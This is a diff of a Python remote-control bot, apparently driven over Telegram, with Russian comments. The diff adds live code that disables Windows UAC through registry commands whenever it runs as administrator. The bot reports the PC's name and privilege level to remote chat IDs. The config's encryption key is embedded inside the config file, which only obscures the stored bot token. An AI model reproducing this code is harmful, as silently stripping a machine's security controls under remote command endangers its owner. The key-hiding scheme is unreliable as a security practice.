@@ -13,39 +13,40 @@ import json as jsn
 from cryptography.fernet import Fernet
 
 
-key = b'eMz2W5yric_QgW1AFy7zsKessRyykkBhmaZIp_ugv0E='
-# if ctypes.windll.shell32.IsUserAnAdmin():
-#     command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
-#     subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-#     command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
-#     subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+name_file = "config" 
 
-def read_config():
-    name_file = "config" 
+with open(name_file, 'rb') as file:
+    data1 = file.read()
 
+if len(data1.split()) > 1: # если не зашифрованный
+
+    key = Fernet.generate_key() # генер ключа шифрования
     f = Fernet(key)
+    encrypted_text = key[:22] + f.encrypt(data1) + key[-22:] 
 
-    with open(name_file, 'rb') as file:
-        data1 = file.read()
+    with open(name_file, 'wb') as file:
+        file.write(encrypted_text)
 
-    if len(data1.split()) > 1:
-
-        encrypted_text = f.encrypt(data1)
-        with open(name_file, 'wb') as file:
-            file.write(encrypted_text)
+else:
 
     with open(name_file, 'rb') as file:
         data2 = file.read()
+    key = data2[:22] + data2[-22:] # чтение ключа
+    f = Fernet(key)
 
-    return f.decrypt(data2).decode().split()
+with open(name_file, 'rb') as file:
+        data3 = file.read()[22:-22]
 
-decrypted_text = read_config()
-class Data:
+decrypted_text = f.decrypt(data3).decode().split()
+
+class Data: 
     name = decrypted_text[0]
     token = decrypted_text[1]
     id = [int(i) for i in decrypted_text[2][1:-1].split(',')] 
     update = int(decrypted_text[3])
-    uis = int(decrypted_text[4])
+    uic = int(decrypted_text[4])
+
+
 
 class Logger_Bot:
     def __init__(self) -> None:
@@ -94,8 +95,25 @@ class Func_API:
         for ids in id:
             try:
                 if ctypes.windll.shell32.IsUserAnAdmin():
-                    bot.send_message(
-                        ids, f'{self.NAME_PC} запущен от имени администратора')
+                    bot.send_message(ids, f'{self.NAME_PC} запущен от имени администратора')
+
+                    if not Data.uic: # Отрубает UAC
+                        try:
+                            command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+                            subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+                            subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            decrypted_text[4] = "1"
+                            decrypted_text = " ".join(decrypted_text).encode('utf-8')
+                            encrypted_text = key[:22] + f.encrypt(decrypted_text) + key[-22:]
+  
+                            with open('config', 'wb') as file:
+                                file.write(encrypted_text) # изменение записи конфига об UIC
+
+                        except Exception as e:
+                                logger.log("disable_UAC",e)
+                                bot.send_message(ids, f'🖥❌ \n{e}')
+
                 else:
                     bot.send_message(
                         ids, f'{self.NAME_PC} запущен от имени обычного пользователя')
